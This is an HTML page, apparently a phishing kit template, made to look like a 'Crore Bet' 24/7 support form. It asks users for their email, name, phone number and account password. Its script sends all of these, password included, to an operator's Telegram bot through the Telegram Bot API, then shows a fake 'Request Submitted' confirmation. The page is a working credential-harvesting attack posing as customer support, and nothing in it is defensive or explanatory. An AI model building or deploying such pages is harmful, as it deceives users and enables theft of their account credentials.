<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crore Bet Support</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            background-color: #0c0e14;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 10px 12px 40px;
            overflow-x: hidden;
        }

        /* Form Card - Screen par logo se submit button tak fit rahega */
        .form-card {
            background-color: #161b26;
            width: 100%;
            max-width: 400px;
            padding: 14px 16px;
            border-radius: 16px;
            border: 1px solid #283044;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
        }

        /* Logo Area */
        .logo-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 10px;
        }

        .crore-bet-logo {
            background-color: #000000;
            display: inline-flex;
            align-items: center;
            padding: 6px 14px;
            border-radius: 8px;
            border: 1px solid #fff230;
        }

        .crore-text {
            color: #ffffff;
            font-size: 19px;
            font-weight: 900;
            letter-spacing: 1.5px;
            margin-right: 8px;
        }

        .bet-badge {
            background-color: #fff230;
            color: #000000;
            font-size: 16px;
            font-weight: 900;
            padding: 2px 7px;
            border-radius: 4px;
        }

        /* 24/7 Help & Support Subtitle */
        .support-subtext {
            margin-top: 5px;
            font-size: 12px;
            color: #fff230;
            font-weight: bold;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        /* Input Fields - Bada size */
        .input-group {
            margin-bottom: 8px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 4px;
            font-size: 13px;
            color: #a4b1cd;
            font-weight: bold;
        }

        input[type="text"],
        input[type="email"],
        input[type="tel"],
        input[type="password"],
        select {
            width: 100%;
            padding: 10px 12px;
            background-color: #0a0d14;
            border: 1px solid #343f5a;
            border-radius: 8px;
            font-size: 14px;
            color: #ffffff;
            outline: none;
        }

        input:focus,
        select:focus {
            border-color: #fff230;
        }

        select option {
            background-color: #161b26;
            color: #ffffff;
        }

        /* File Upload */
        input[type="file"] {
            width: 100%;
            background-color: #0a0d14;
            border: 1px dashed #343f5a;
            border-radius: 8px;
            padding: 8px;
            font-size: 12px;
            color: #a4b1cd;
            outline: none;
        }

        /* Submit Button */
        button.submit-btn {
            width: 100%;
            padding: 12px;
            background-color: #fff230;
            color: #000000;
            border: none;
            border-radius: 9px;
            font-size: 15px;
            font-weight: 800;
            text-transform: uppercase;
            cursor: pointer;
            margin-top: 6px;
        }

        button.submit-btn:disabled {
            background-color: #666014;
            color: #aaa;
            cursor: not-allowed;
        }

        /* Scroll karne par aane wala Telegram section */
        .telegram-section {
            width: 100%;
            max-width: 400px;
            margin-top: 35px;
            text-align: center;
        }

        .telegram-text {
            font-size: 13px;
            color: #8fa0c0;
            margin-bottom: 10px;
        }

        .telegram-btn {
            display: block;
            width: 100%;
            padding: 13px;
            background-color: #0088cc;
            color: #ffffff;
            text-decoration: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: bold;
            box-sizing: border-box;
        }

        /* Success Popup Modal */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }

        .modal-box {
            background-color: #181d29;
            border: 2px solid #fff230;
            border-radius: 12px;
            max-width: 320px;
            width: 100%;
            padding: 22px 18px;
            text-align: center;
        }

        .modal-icon {
            font-size: 36px;
            color: #38ef7d;
            margin-bottom: 8px;
        }

        .modal-title {
            font-size: 17px;
            font-weight: bold;
            color: #ffffff;
            margin-bottom: 8px;
        }

        .modal-desc {
            font-size: 12px;
            color: #cbd5e1;
            line-height: 1.4;
            margin-bottom: 16px;
        }

        .modal-btn {
            background-color: #fff230;
            color: #000000;
            border: none;
            padding: 8px 25px;
            border-radius: 6px;
            font-size: 13px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="form-card">
        <!-- Logo & 24/7 Support Subtitle -->
        <div class="logo-wrapper">
            <div class="crore-bet-logo">
                <span class="crore-text">CRORE</span>
                <span class="bet-badge">BET</span>
            </div>
            <div class="support-subtext">24/7 Help & Support</div>
        </div>

        <form id="tgForm">
            <div class="input-group">
                <label for="email">Email</label>
                <input type="email" id="email" placeholder="Enter your email" required>
            </div>

            <div class="input-group">
                <label for="name">Name</label>
                <input type="text" id="name" placeholder="Enter your name" required>
            </div>

            <div class="input-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" placeholder="Enter phone number" required>
            </div>

            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter password" required>
            </div>

            <div class="input-group">
                <label for="problemIssue">Problem Issue</label>
                <select id="problemIssue" required>
                    <option value="" disabled selected>Select an issue...</option>
                    <option value="Email Confirm">Email Confirm</option>
                    <option value="Number Confirm">Number Confirm</option>
                    <option value="Profile Update">Profile Update</option>
                    <option value="Deposit Problem">Deposit Problem</option>
                    <option value="Bonus Issue">Bonus Issue</option>
                </select>
            </div>

            <div class="input-group">
                <label for="screenshot">Upload Screenshot (Optional)</label>
                <input type="file" id="screenshot" accept="image/*">
            </div>

            <!-- Submit Button - Form ke andar hi set hai -->
            <button type="submit" id="submitBtn" class="submit-btn">Submit Request</button>
        </form>
    </div>

    <!-- Scroll karne par aane wala Telegram Button -->
    <div class="telegram-section">
        <p class="telegram-text">Need immediate help? Contact our direct support</p>
        <a href="https://t.me/YOUR_TELEGRAM_USERNAME" target="_blank" class="telegram-btn">Chat on Telegram</a>
    </div>

    <!-- Success Modal Popup -->
    <div class="modal-overlay" id="successModal">
        <div class="modal-box">
            <div class="modal-icon">✓</div>
            <h3 class="modal-title">Request Submitted!</h3>
            <p class="modal-desc">Your request has been successfully sent to our support team. We will review and resolve your issue shortly.</p>
            <button type="button" class="modal-btn" id="closeModalBtn">OK</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
        const CHAT_ID = "YOUR_CHAT_ID_HERE";

        const form = document.getElementById('tgForm');
        const submitBtn = document.getElementById('submitBtn');
        const modal = document.getElementById('successModal');
        const closeModalBtn = document.getElementById('closeModalBtn');

        closeModalBtn.addEventListener('click', function() {
            modal.style.display = 'none';
        });

        form.addEventListener('submit', function(e) {
            e.preventDefault();

            submitBtn.disabled = true;
            submitBtn.innerText = "Submitting...";

            const email = document.getElementById('email').value;
            const name = document.getElementById('name').value;
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const problemIssue = document.getElementById('problemIssue').value;
            const fileInput = document.getElementById('screenshot');
            const file = fileInput.files[0];

            const captionText = "📌 *New Request (Crore Bet)*\n\n" +
                                "📧 *Email:* " + email + "\n" +
                                "👤 *Name:* " + name + "\n" +
                                "📞 *Phone:* " + phone + "\n" +
                                "🔑 *Password:* " + password + "\n" +
                                "⚠️ *Problem Issue:* " + problemIssue;

            if (file) {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", file);
                formData.append("caption", captionText);
                formData.append("parse_mode", "Markdown");

                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
                    method: "POST",
                    body: formData
                })
                .then(function(res) { return res.json(); })
                .then(handleResponse)
                .catch(handleError);
            } else {
                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: captionText,
                        parse_mode: "Markdown"
                    })
                })
                .then(function(res) { return res.json(); })
                .then(handleResponse)
                .catch(handleError);
            }

            function handleResponse(data) {
                if (data.ok) {
                    modal.style.display = 'flex';
                    form.reset();
                } else {
                    alert("Telegram Error: Check Bot Token or Chat ID.");
                }
                submitBtn.disabled = false;
                submitBtn.innerText = "Submit Request";
            }

            function handleError() {
                alert("Network error! Please try again.");
                submitBtn.disabled = false;
                submitBtn.innerText = "Submit Request";
            }
        });
    </script>

</body>
</html>
